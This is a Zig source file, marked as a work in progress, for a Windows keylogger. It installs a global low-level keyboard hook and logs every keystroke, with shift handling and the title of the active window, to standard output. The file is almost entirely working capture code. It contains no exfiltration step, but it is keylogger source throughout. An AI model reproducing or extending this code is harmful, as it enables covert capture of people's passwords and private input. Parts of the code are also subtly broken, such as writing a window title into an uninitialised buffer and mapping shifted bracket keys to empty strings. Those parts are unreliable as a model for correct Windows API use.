// WORK IN PROGRESS

const std = @import("std");
const win = std.os.windows;

const WINAPI = win.WINAPI;
const LPWSTR = win.LPWSTR;
const LPSTR = win.LPSTR;
const INT = win.INT;
const UINT = win.UINT;
const HWND = win.HWND;
const HANDLE = win.HANDLE;
const WPARAM = win.WPARAM;
const LPARAM = win.LPARAM;
const LRESULT = win.LRESULT;
const DWORD = win.DWORD;
const ULONG_PTR = win.ULONG_PTR;
const PKBDLLHOOKSTRUCT = *KBDLLHOOKSTRUCT;
const BOOL = win.BOOL;
const SHORT = win.SHORT;
const HINSTANCE = win.HINSTANCE;
const MSG = win.user32.MSG;
const HHOOK = [*c]struct_HHOOK__;
const HOOKPROC = ?*const fn (c_int, WPARAM, LPARAM) callconv(WINAPI) LRESULT;
const WH_KEYBOARD_LL: INT = 13;

pub const KBDLLHOOKSTRUCT = extern struct {
    vkCode: DWORD,
    scanCode: DWORD,
    flags: DWORD,
    time: DWORD,
    dwExtraInfo: ULONG_PTR,
};

pub const struct_HHOOK__ = extern struct {
    unused: INT,
};

extern "user32" fn GetForegroundWindow() callconv(WINAPI) ?HWND;
extern "user32" fn GetWindowTextW(hWnd: HWND, lpString: LPWSTR, nMaxCount: INT) callconv(WINAPI) INT;
extern "user32" fn GetKeyState(nVirtKey: INT) callconv(WINAPI) SHORT;
extern "user32" fn PostMessageW(hWnd: ?HWND, Msg: UINT, wParam: WPARAM, lParam: LPARAM) callconv(WINAPI) BOOL;
extern "user32" fn SetWindowsHookExW(idHook: INT, lpfn: HOOKPROC, hmod: ?HINSTANCE, dwThreadId: DWORD) callconv(WINAPI) HHOOK;
extern "user32" fn CallNextHookEx(hhk: HHOOK, nCode: INT, wParam: WPARAM, lParam: LPARAM) callconv(WINAPI) LRESULT;
extern "user32" fn UnhookWindowsHookEx(hhk: HHOOK) callconv(WINAPI) BOOL;

const allocator = std.heap.page_allocator;
var keyMap = std.AutoHashMap(Keys, []const u8).init(allocator);
var keyMapShift = std.AutoHashMap(Keys, []const u8).init(allocator);

pub fn main() !void {
    try addKeyMap();
    try addKeyMapShift();
    defer keyMap.deinit();
    defer keyMapShift.deinit();

    //[*c]struct_HHOOK__
    //HOOKPROC = ?*const fn (c_int, WPARAM, LPARAM) callconv(.C) LRESULT;
    var hook = SetWindowsHookExW(WH_KEYBOARD_LL, &HookCallback, null, 0);
    if (true) {
        try std.io.getStdOut().writer().print("[*] Hook successful\n", .{});
        _ = PostMessageW(null, 0, 0, 0);

        var msg: MSG = undefined;
        //const a: u32 = 67;
        //var x: Keys = @enumFromInt(a);
        //std.debug.print("ERROR! {any}", .{x});

        while (win.user32.GetMessageW(&msg, null, 0, 0) > 0) {
            //std.debug.print("ERROR!", .{});
        }
        defer _ = UnhookWindowsHookEx(hook);
    }
}

fn GetActiveWindowTitle() LPWSTR {
    var capacity: INT = 256;
    var builder: LPWSTR = undefined;
    var wHandle = GetForegroundWindow();
    //defer win.CloseHandle(wHandle);
    _ = GetWindowTextW(wHandle.?, builder, capacity);
    return builder;
}

fn HookCallback(nCode: INT, wParam: WPARAM, lParam: LPARAM) callconv(WINAPI) LRESULT {
    const stdout = std.io.getStdOut().writer();
    if (nCode >= 0 and wParam == win.user32.WM_KEYDOWN) {
        var keypressed: []const u8 = undefined;
        var lParamConv: usize = @intCast(lParam);
        var kbdstruct: PKBDLLHOOKSTRUCT = @ptrFromInt(lParamConv);
        //std.debug.print("ERROR! {any}, {any}, {any}\n", .{ wParam, lParam, kbdstruct });
        var currentActiveWindow = GetActiveWindowTitle();
        var shifted = GetKeyState(160) < 0 or GetKeyState(161) < 0;
        var keycode: Keys = @enumFromInt(kbdstruct.vkCode);

        if (shifted and keyMap.contains(keycode)) {
            keypressed = keyMapShift.get(keycode).?;
        } else if (keyMap.contains(keycode)) {
            keypressed = keyMap.get(keycode).?;
        } else {
            //var capped: bool = GetKeyState(20) != 0;
            keypressed = @tagName(keycode);
            //std.debug.print("ERROR! {s}\n", .{keypressed});
            //if ((capped and shifted) or !(capped or shifted)) {

            //}
        }

        stdout.print("[*] Key: {s} [Window: '{any}']\n", .{ keypressed, currentActiveWindow }) catch undefined;
    }
    return CallNextHookEx(0, nCode, wParam, lParam);
}

// keyMap
fn addKeyMap() !void {
    try keyMap.put(Keys.Attn, "[Attn]");
    try keyMap.put(Keys.Clear, "[Clear]");
    try keyMap.put(Keys.Down, "[Down]");
    try keyMap.put(Keys.Up, "[Up]");
    try keyMap.put(Keys.Left, "[Left]");
    try keyMap.put(Keys.Right, "[Right]");
    try keyMap.put(Keys.Escape, "[Escape]");
    try keyMap.put(Keys.Tab, "[Tab]");
    try keyMap.put(Keys.LWin, "[LeftWin]");
    try keyMap.put(Keys.RWin, "[RightWin]");
    try keyMap.put(Keys.PrintScreen, "[PrintScreen]");
    try keyMap.put(Keys.D0, "0");
    try keyMap.put(Keys.D1, "1");
    try keyMap.put(Keys.D2, "2");
    try keyMap.put(Keys.D3, "3");
    try keyMap.put(Keys.D4, "4");
    try keyMap.put(Keys.D5, "5");
    try keyMap.put(Keys.D6, "6");
    try keyMap.put(Keys.D7, "7");
    try keyMap.put(Keys.D8, "8");
    try keyMap.put(Keys.D9, "9");
    try keyMap.put(Keys.Space, " ");
    try keyMap.put(Keys.NumLock, "[NumLock]");
    try keyMap.put(Keys.Alt, "[Alt]");
    try keyMap.put(Keys.LControlKey, "[LeftControl]");
    try keyMap.put(Keys.RControlKey, "[RightControl]");
    try keyMap.put(Keys.Delete, "[Delete]");
    try keyMap.put(Keys.Enter, "[Enter]");
    try keyMap.put(Keys.Divide, "/");
    try keyMap.put(Keys.Multiply, "*");
    try keyMap.put(Keys.Add, "+");
    try keyMap.put(Keys.Subtract, "-");
    try keyMap.put(Keys.PageDown, "[PageDown]");
    try keyMap.put(Keys.PageUp, "[PageUp]");
    try keyMap.put(Keys.End, "[End]");
    try keyMap.put(Keys.Insert, "[Insert]");
    try keyMap.put(Keys.Decimal, ".");
    try keyMap.put(Keys.OemSemicolon, ";");
    try keyMap.put(Keys.Oemtilde, "`");
    try keyMap.put(Keys.Oemplus, "=");
    try keyMap.put(Keys.OemMinus, "-");
    try keyMap.put(Keys.Oemcomma, ",");
    try keyMap.put(Keys.OemPeriod, ".");
    try keyMap.put(Keys.OemPipe, "\\");
    try keyMap.put(Keys.OemQuotes, "\"");
    try keyMap.put(Keys.OemCloseBrackets, "]");
    try keyMap.put(Keys.OemOpenBrackets, "[");
    try keyMap.put(Keys.Home, "[Home]");
    try keyMap.put(Keys.Back, "[Backspace]");
    try keyMap.put(Keys.NumPad0, "0");
    try keyMap.put(Keys.NumPad1, "1");
    try keyMap.put(Keys.NumPad2, "2");
    try keyMap.put(Keys.NumPad3, "3");
    try keyMap.put(Keys.NumPad4, "4");
    try keyMap.put(Keys.NumPad5, "5");
    try keyMap.put(Keys.NumPad6, "6");
    try keyMap.put(Keys.NumPad7, "7");
    try keyMap.put(Keys.NumPad8, "8");
    try keyMap.put(Keys.NumPad9, "9");
}

// keyMapShift
fn addKeyMapShift() !void {
    try keyMapShift.put(Keys.D0, ")");
    try keyMapShift.put(Keys.D1, "!");
    try keyMapShift.put(Keys.D2, "@");
    try keyMapShift.put(Keys.D3, "#");
    try keyMapShift.put(Keys.D4, "$");
    try keyMapShift.put(Keys.D5, "%");
    try keyMapShift.put(Keys.D6, "^");
    try keyMapShift.put(Keys.D7, "&");
    try keyMapShift.put(Keys.D8, "*");
    try keyMapShift.put(Keys.D9, "(");
    try keyMapShift.put(Keys.OemSemicolon, ":");
    try keyMapShift.put(Keys.Oemtilde, "~");
    try keyMapShift.put(Keys.Oemplus, "+");
    try keyMapShift.put(Keys.OemMinus, "_");
    try keyMapShift.put(Keys.Oemcomma, "<");
    try keyMapShift.put(Keys.OemPeriod, ">");
    try keyMapShift.put(Keys.OemPipe, "|");
    try keyMapShift.put(Keys.OemQuotes, "'");
    try keyMapShift.put(Keys.OemCloseBrackets, "");
    try keyMapShift.put(Keys.OemOpenBrackets, "");
}

const Keys = enum(u32) {
    //Modifiers = -65536,
    None = 0,
    LButton = 1,
    RButton = 2,
    Cancel = 3,
    MButton = 4,
    XButton1 = 5,
    XButton2 = 6,
    Back = 8,
    Tab = 9,
    LineFeed = 10,
    Clear = 12,
    //Return = 13,
    Enter = 13,
    ShiftKey = 16,
    ControlKey = 17,
    Menu = 18,
    Pause = 19,
    Capital = 20,
    //CapsLock = 20,
    KanaMode = 21,
    //HanguelMode = 21,
    //HangulMode = 21,
    JunjaMode = 23,
    FinalMode = 24,
    //HanjaMode = 25,
    KanjiMode = 25,
    Escape = 27,
    IMEConvert = 28,
    IMENonconvert = 29,
    IMEAccept = 30,
    //IMEAceept = 30,
    IMEModeChange = 31,
    Space = 32,
    //Prior = 33,
    PageUp = 33,
    //Next = 34,
    PageDown = 34,
    End = 35,
    Home = 36,
    Left = 37,
    Up = 38,
    Right = 39,
    Down = 40,
    Select = 41,
    Print = 42,
    Execute = 43,
    //Snapshot = 44,
    PrintScreen = 44,
    Insert = 45,
    Delete = 46,
    Help = 47,
    D0 = 48,
    D1 = 49,
    D2 = 50,
    D3 = 51,
    D4 = 52,
    D5 = 53,
    D6 = 54,
    D7 = 55,
    D8 = 56,
    D9 = 57,
    A = 65,
    B = 66,
    C = 67,
    D = 68,
    E = 69,
    F = 70,
    G = 71,
    H = 72,
    I = 73,
    J = 74,
    K = 75,
    L = 76,
    M = 77,
    N = 78,
    O = 79,
    P = 80,
    Q = 81,
    R = 82,
    S = 83,
    T = 84,
    U = 85,
    V = 86,
    W = 87,
    X = 88,
    Y = 89,
    Z = 90,
    LWin = 91,
    RWin = 92,
    Apps = 93,
    Sleep = 95,
    NumPad0 = 96,
    NumPad1 = 97,
    NumPad2 = 98,
    NumPad3 = 99,
    NumPad4 = 100,
    NumPad5 = 101,
    NumPad6 = 102,
    NumPad7 = 103,
    NumPad8 = 104,
    NumPad9 = 105,
    Multiply = 106,
    Add = 107,
    Separator = 108,
    Subtract = 109,
    Decimal = 110,
    Divide = 111,
    F1 = 112,
    F2 = 113,
    F3 = 114,
    F4 = 115,
    F5 = 116,
    F6 = 117,
    F7 = 118,
    F8 = 119,
    F9 = 120,
    F10 = 121,
    F11 = 122,
    F12 = 123,
    F13 = 124,
    F14 = 125,
    F15 = 126,
    F16 = 127,
    F17 = 128,
    F18 = 129,
    F19 = 130,
    F20 = 131,
    F21 = 132,
    F22 = 133,
    F23 = 134,
    F24 = 135,
    NumLock = 144,
    Scroll = 145,
    LShiftKey = 160,
    RShiftKey = 161,
    LControlKey = 162,
    RControlKey = 163,
    LMenu = 164,
    RMenu = 165,
    BrowserBack = 166,
    BrowserForward = 167,
    BrowserRefresh = 168,
    BrowserStop = 169,
    BrowserSearch = 170,
    BrowserFavorites = 171,
    BrowserHome = 172,
    VolumeMute = 173,
    VolumeDown = 174,
    VolumeUp = 175,
    MediaNextTrack = 176,
    MediaPreviousTrack = 177,
    MediaStop = 178,
    MediaPlayPause = 179,
    LaunchMail = 180,
    SelectMedia = 181,
    LaunchApplication1 = 182,
    LaunchApplication2 = 183,
    OemSemicolon = 186,
    //Oem1 = 186,
    Oemplus = 187,
    Oemcomma = 188,
    OemMinus = 189,
    OemPeriod = 190,
    OemQuestion = 191,
    //Oem2 = 191,
    Oemtilde = 192,
    //Oem3 = 192,
    OemOpenBrackets = 219,
    //Oem4 = 219,
    OemPipe = 220,
    //Oem5 = 220,
    OemCloseBrackets = 221,
    //Oem6 = 221,
    OemQuotes = 222,
    //Oem7 = 222,
    Oem8 = 223,
    OemBackslash = 226,
    //Oem102 = 226,
    ProcessKey = 229,
    Packet = 231,
    Attn = 246,
    Crsel = 247,
    Exsel = 248,
    EraseEof = 249,
    Play = 250,
    Zoom = 251,
    NoName = 252,
    Pa1 = 253,
    OemClear = 254,
    KeyCode = 65535,
    Shift = 65536,
    Control = 131072,
    Alt = 262144,
};
